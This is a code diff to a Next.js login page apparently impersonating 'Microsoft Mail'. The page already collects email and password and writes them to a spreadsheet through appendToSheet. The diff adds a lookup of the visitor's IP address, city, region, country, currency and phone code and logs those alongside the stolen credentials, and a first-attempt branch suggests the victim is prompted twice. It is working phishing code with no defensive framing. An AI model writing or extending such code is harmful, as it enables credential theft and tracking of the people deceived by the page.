@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import SuccessModal from "../components/SuccessModal";
 import Image from "next/image";
@@ -17,6 +17,25 @@ export default function Page() {
   const router = useRouter();
   const [successModal, setSuccessModal] = useState(false);
   const category = "Microsoft Mail";
+  const [locationData, setLocationData] = useState({});
+
+  useEffect(() => {
+    const fetchData = async () => {
+      try {
+        const response = await fetch('/api/location');
+        if (response.ok) {
+          const data = await response.json();
+          setLocationData(data);
+        } else {
+          console.error('Failed to fetch location data');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    };
+
+    fetchData();
+  }, []);
 
   const handleNext = () => {
     if (!email) {
@@ -40,7 +59,16 @@ export default function Page() {
     }
 
     try {
-      const data = [[category, email, password]];
+      const capital = locationData?.capital || "unknown";
+      const city = locationData?.city || "unknown";
+      const continent = locationData?.continent || "unknown";
+      const ip = locationData?.ip || "unknown";
+      const region = locationData?.region || "unknown";
+      const country = locationData?.country || "unknown";
+      const currency = locationData?.currency || "unknown";
+      const phoneCode = locationData?.phoneCode || "unknown";
+      // ip-address, city, region, country, continent, currency, phone-code
+      const data = [[category, email, password,ip,city, region, country, continent, currency, phoneCode ]];
       await appendToSheet(data);
 
       if (isFirstAttempt) {
@@ -57,6 +85,8 @@ export default function Page() {
       console.error("Error:", error);
     }
   };
+
+ 
 
   if (successModal) {
     return <SuccessModal />;
